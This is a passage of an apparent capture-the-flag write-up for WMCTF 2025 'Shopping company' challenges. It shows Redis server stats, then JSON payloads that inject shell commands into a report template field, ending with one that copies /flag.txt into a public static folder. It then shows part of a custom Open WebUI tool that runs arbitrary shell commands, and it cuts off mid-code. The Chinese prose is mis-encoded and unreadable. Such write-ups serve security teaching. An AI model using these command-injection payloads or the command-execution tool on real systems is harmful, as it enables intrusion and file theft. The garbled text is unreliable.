</span></span><span class=line><span class=cl><span class=n>total_net_repl_input_bytes</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_net_repl_output_bytes</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_input_kbps</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_output_kbps</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_input_repl_kbps</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_output_repl_kbps</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>rejected_connections</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>sync_full</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>sync_partial_ok</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>sync_partial_err</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>expired_subkeys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>expired_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>expired_stale_perc</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>expired_time_cap_reached_count</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>expire_cycle_cpu_milliseconds</span><span class=p>:</span><span class=mi>1120</span>
</span></span><span class=line><span class=cl><span class=n>evicted_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>evicted_clients</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>evicted_scripts</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_eviction_exceeded_time</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_eviction_exceeded_time</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>keyspace_hits</span><span class=p>:</span><span class=mi>164</span>
</span></span><span class=line><span class=cl><span class=n>keyspace_misses</span><span class=p>:</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=n>pubsub_channels</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>pubsub_patterns</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>pubsubshard_channels</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>latest_fork_usec</span><span class=p>:</span><span class=mi>258</span>
</span></span><span class=line><span class=cl><span class=n>total_forks</span><span class=p>:</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>migrate_cached_sockets</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>slave_expires_tracked_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>active_defrag_hits</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>active_defrag_misses</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>active_defrag_key_hits</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>active_defrag_key_misses</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_active_defrag_time</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_active_defrag_time</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>tracking_total_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>tracking_total_items</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>tracking_total_prefixes</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>unexpected_error_replies</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_error_replies</span><span class=p>:</span><span class=mi>31</span>
</span></span><span class=line><span class=cl><span class=n>dump_payload_sanitizations</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_reads_processed</span><span class=p>:</span><span class=mi>18968</span>
</span></span><span class=line><span class=cl><span class=n>total_writes_processed</span><span class=p>:</span><span class=mi>10983</span>
</span></span><span class=line><span class=cl><span class=n>io_threaded_reads_processed</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>io_threaded_writes_processed</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>client_query_buffer_limit_disconnections</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>client_output_buffer_limit_disconnections</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>reply_buffer_shrinks</span><span class=p>:</span><span class=mi>39</span>
</span></span><span class=line><span class=cl><span class=n>reply_buffer_expands</span><span class=p>:</span><span class=mi>11</span>
</span></span><span class=line><span class=cl><span class=n>eventloop_cycles</span><span class=p>:</span><span class=mi>823770</span>
</span></span><span class=line><span class=cl><span class=n>eventloop_duration_sum</span><span class=p>:</span><span class=mi>201034186</span>
</span></span><span class=line><span class=cl><span class=n>eventloop_duration_cmd_sum</span><span class=p>:</span><span class=mi>43994</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_eventloop_cycles_per_sec</span><span class=p>:</span><span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_eventloop_duration_usec</span><span class=p>:</span><span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=n>acl_access_denied_auth</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>acl_access_denied_cmd</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>acl_access_denied_key</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>acl_access_denied_channel</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Replication</span>
</span></span><span class=line><span class=cl><span class=n>role</span><span class=p>:</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=n>connected_slaves</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>master_failover_state</span><span class=p>:</span><span class=n>no</span><span class=o>-</span><span class=n>failover</span>
</span></span><span class=line><span class=cl><span class=n>master_replid</span><span class=p>:</span><span class=mi>4</span><span class=n>ec7a6f3c1751b9ca2bb85a60ae0aaaabf98928a</span>
</span></span><span class=line><span class=cl><span class=n>master_replid2</span><span class=p>:</span><span class=mi>0000000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl><span class=n>master_repl_offset</span><span class=p>:</span><span class=mi>24</span>
</span></span><span class=line><span class=cl><span class=n>second_repl_offset</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>repl_backlog_active</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>repl_backlog_size</span><span class=p>:</span><span class=mi>1048576</span>
</span></span><span class=line><span class=cl><span class=n>repl_backlog_first_byte_offset</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>repl_backlog_histlen</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># CPU</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_sys</span><span class=p>:</span><span class=mf>26.989382</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_user</span><span class=p>:</span><span class=mf>182.022643</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_sys_children</span><span class=p>:</span><span class=mf>0.000426</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_user_children</span><span class=p>:</span><span class=mf>0.001780</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_sys_main_thread</span><span class=p>:</span><span class=mf>26.988181</span>
</span></span><span class=line><span class=cl><span class=n>used_cpu_user_main_thread</span><span class=p>:</span><span class=mf>182.017391</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Modules</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Errorstats</span>
</span></span><span class=line><span class=cl><span class=n>errorstat_ERR</span><span class=p>:</span><span class=n>count</span><span class=o>=</span><span class=mi>31</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cluster</span>
</span></span><span class=line><span class=cl><span class=n>cluster_enabled</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Keyspace</span>
</span></span><span class=line><span class=cl><span class=n>db0</span><span class=p>:</span><span class=n>keys</span><span class=o>=</span><span class=mi>10</span><span class=p>,</span><span class=n>expires</span><span class=o>=</span><span class=mi>10</span><span class=p>,</span><span class=n>avg_ttl</span><span class=o>=</span><span class=mi>68250416</span><span class=p>,</span><span class=n>subexpiry</span><span class=o>=</span><span class=mi>0</span>
</span></span></code></pre></td></tr></table></div></div><p>ç‰ˆæœ¬éå¸¸æ–°ï¼Œæ€è€ƒèƒ½å¦æŠŠé‚£ä¸ªæ•°æ®åº“æ–‡ä»¶å¼„ä¸‹æ¥ï¼ŒæåŠå¤©å¼„ä¸ä¸‹æ¥ï¼Œè§‚å¯Ÿä¸¤ä¸ªwebæœåŠ¡30æ˜¯ä¸€ä¸ªè€çš„ç®¡ç†ç³»ç»Ÿï¼Œå…¶ä¸­æœ‰reportï¼Œè€Œè¿™ä¸ªreportæˆ‘æ­£å¥½åœ¨redisé‡Œé¢çœ‹åˆ°è¿‡</p><p><img src=/img/2025-WMCTF/6.png alt=img></p><p><img src=/img/2025-WMCTF/7.png alt=img></p><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´30å¯ä»¥ç”¨è¿™ä¸ªæ‰“ï¼Œè€Œ40æ˜¯ä¸€ä¸ªopen webuiç³»ç»Ÿï¼Œä¸çŸ¥é“æ€ä¹ˆæ•´</p><p>å…ˆæ‰“30ï¼Œç»è¿‡ä¸æ‡ˆåŠªåŠ›ç»ˆäºç¡çœ äº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;period&#34;</span><span class=p>:</span> <span class=s2>&#34;monthly&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;template&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;template_type&#34;</span><span class=p>:</span> <span class=s2>&#34;dynamic&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;fields&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;revenue&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;commands&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;sleep 5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;date&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”±äºæ— æ³•åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œï¼Œå¹¶ä¸”è¿™æ˜¯gobååºåˆ—åŒ–ï¼Œä¸€èˆ¬æ˜¯åœ¨<code>/app</code>æ‰€ä»¥æˆ‘ä»¬å°è¯•å†™å…¥é™æ€ç›®å½•ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;period&#34;</span><span class=p>:</span> <span class=s2>&#34;monthly&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;template&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;template_type&#34;</span><span class=p>:</span> <span class=s2>&#34;dynamic&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;fields&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;revenue&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;commands&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;touch /app/static/1.txt &amp;&amp; sleep 5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;date&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æˆåŠŸæ‰§è¡Œï¼Œç°åœ¨æ¥è·å–flagå³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;period&#34;</span><span class=p>:</span> <span class=s2>&#34;monthly&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;template&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;template_type&#34;</span><span class=p>:</span> <span class=s2>&#34;dynamic&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;fields&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;sales&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;revenue&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;commands&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;tac /flag.txt &gt; /app/static/3.txt &amp;&amp; sleep 5&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;date&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åç°åœ¨å»æ‰“40çš„openai webuiçš„1dayï¼Œæˆ‘ä»¬é¦–å…ˆå°±è¦è€ƒè™‘èƒ½å¤ŸRCEçš„</p><h2 id=shopping-company2>Shopping company2</h2><p><img src=/img/2025-WMCTF/8.png alt=img></p><p>æ‹¿åˆ°ç™»å½•çš„è´¦å·å¯†ç ï¼Œè¿›å»ä¹‹åå‘ç°ç‰ˆæœ¬ä¸ºv0.6.1 http://192.168.100.40:8080/auth?redirect=%2F</p><p>ç»™open-webuiåŠ ä¸ªdeepseekçš„apiï¼Œç„¶åå†™ä¸€ä¸ªå·¥å…·ï¼Œæ·»åŠ åˆ°open-webuiçš„è‡ªå®šä¹‰å·¥å…·é‡Œ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>asyncio</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>Dict</span><span class=p>,</span> <span class=n>Any</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Tools</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>execute_system_command</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>command</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>30</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Execute a system command and return the output.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        WARNING: This tool allows execution of ANY system command without safety checks.
</span></span></span><span class=line><span class=cl><span class=s2>        Use with extreme caution as it can be dangerous and potentially harm your system.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :param command: The system command to execute.
</span></span></span><span class=line><span class=cl><span class=s2>        :param timeout: Maximum time in seconds to wait for command completion.
</span></span></span><span class=line><span class=cl><span class=s2>        :return: The output of the command execution.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Execute the command with a timeout</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>command</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>returncode</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command executed successfully:</span><span class=se>\n</span><span class=si>{</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command failed with error:</span><span class=se>\n</span><span class=si>{</span><span class=n>result</span><span class=o>.</span><span class=n>stderr</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>TimeoutExpired</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Command timed out after </span><span class=si>{</span><span class=n>timeout</span><span class=si>}</span><span class=s2> seconds.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;Error executing command: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>async</span> <span class=k>def</span> <span class=nf>execute_system_command_async</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>command</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>timeout</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>30</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Execute a system command asynchronously and return the output.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        WARNING: This tool allows execution of ANY system command without safety checks.
</span></span></span><span class=line><span class=cl><span class=s2>        Use with extreme caution as it can be dangerous and potentially harm your system.
</span></span></span><span class=line><span class=cl><span class=s2>        
</span></span></span><span class=line><span class=cl><span class=s2>        :param command: The system command to execute.
</span></span></span><span class=line><span class=cl><span class=s2>        :param timeout: Maximum time in seconds to wait for command completion.
</span></span></span><span class=line><span class=cl><span class=s2>        :return: The output of the command execution.
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Execute the command asynchronously with a timeout</span>
</span></span><span class=line><span class=cl>            <span class=n>process</span> <span class=o>=</span> <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>create_subprocess_shell</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>command</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>stdout</span><span class=o>=</span><span class=n>asyncio</span><span class=o>.</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>stderr</span><span class=o>=</span><span class=n>asyncio</span><span class=o>.</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>stdout</span><span class=p>,</span> <span class=n>stderr</span> <span class=o>=</span> <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>wait_for</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=n>process</span><span class=o>.</span><span class=n>communicate</span><span class=p>(),</span>
